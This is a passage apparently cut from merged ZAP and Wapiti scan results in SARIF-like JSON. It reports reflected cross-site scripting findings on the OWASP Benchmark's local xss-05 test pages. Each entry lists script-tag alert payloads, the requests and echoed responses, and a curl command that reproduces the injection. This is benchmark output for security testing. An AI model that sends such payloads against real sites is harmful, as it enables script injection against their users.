            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02586?BenchmarkTest02586=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02586.html?BenchmarkTest02586=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02586?username=alice&password=Letm3in_&BenchmarkTest02586=%3CScRiPt%3Ealert%28%27w8wxwjm7ku%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w8wxwjm7ku')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02587?BenchmarkTest02587=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02587?username=alice&password=Letm3in_&BenchmarkTest02587=%3CScRiPt%3Ealert%28%27wk4eacxcl4%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wk4eacxcl4')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wk4eacxcl4')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02587?username=alice&password=Letm3in_&BenchmarkTest02587=%3CScRiPt%3Ealert%28%27wk4eacxcl4%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02587.html?BenchmarkTest02587=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02587"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02587?BenchmarkTest02587=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02587.html?BenchmarkTest02587=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02587?username=alice&password=Letm3in_&BenchmarkTest02587=%3CScRiPt%3Ealert%28%27wk4eacxcl4%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wk4eacxcl4')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02588?BenchmarkTest02588=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02588?username=alice&password=Letm3in_&BenchmarkTest02588=%3CScRiPt%3Ealert%28%27wp1f80g1xy%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wp1f80g1xy')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wp1f80g1xy')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02588?username=alice&password=Letm3in_&BenchmarkTest02588=%3CScRiPt%3Ealert%28%27wp1f80g1xy%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02588.html?BenchmarkTest02588=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02588"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02588?BenchmarkTest02588=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02588.html?BenchmarkTest02588=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02588?username=alice&password=Letm3in_&BenchmarkTest02588=%3CScRiPt%3Ealert%28%27wp1f80g1xy%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:16 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wp1f80g1xy')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02591?BenchmarkTest02591=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02591?username=alice&password=Letm3in_&BenchmarkTest02591=%3CScRiPt%3Ealert%28%27w7d5sh3ea5%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w7d5sh3ea5')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w7d5sh3ea5')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02591?username=alice&password=Letm3in_&BenchmarkTest02591=%3CScRiPt%3Ealert%28%27w7d5sh3ea5%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02591.html?BenchmarkTest02591=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02591"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02591?BenchmarkTest02591=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02591.html?BenchmarkTest02591=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02591?username=alice&password=Letm3in_&BenchmarkTest02591=%3CScRiPt%3Ealert%28%27w7d5sh3ea5%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '59', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt>_SafeStuff and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '69', 'date': 'Sun, 31 Aug 2025 04:22:16 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('w7d5sh3ea5')</sCrIpT>_SafeStuff and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02595?BenchmarkTest02595=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02595?username=alice&password=Letm3in_&BenchmarkTest02595=%3CScRiPt%3Ealert%28%27wvbyth7wge%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wvbyth7wge')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wvbyth7wge')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02595?username=alice&password=Letm3in_&BenchmarkTest02595=%3CScRiPt%3Ealert%28%27wvbyth7wge%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02595.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02595"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02595?BenchmarkTest02595=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02595.html?BenchmarkTest02595=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02595?username=alice&password=Letm3in_&BenchmarkTest02595=%3CScRiPt%3Ealert%28%27wvbyth7wge%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:15 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:22:16 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wvbyth7wge')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02598?BenchmarkTest02598=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02598?username=alice&password=Letm3in_&BenchmarkTest02598=%3CScRiPt%3Ealert%28%27w8j39p9h0p%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w8j39p9h0p')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w8j39p9h0p')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02598?username=alice&password=Letm3in_&BenchmarkTest02598=%3CScRiPt%3Ealert%28%27w8j39p9h0p%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02598.html?BenchmarkTest02598=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
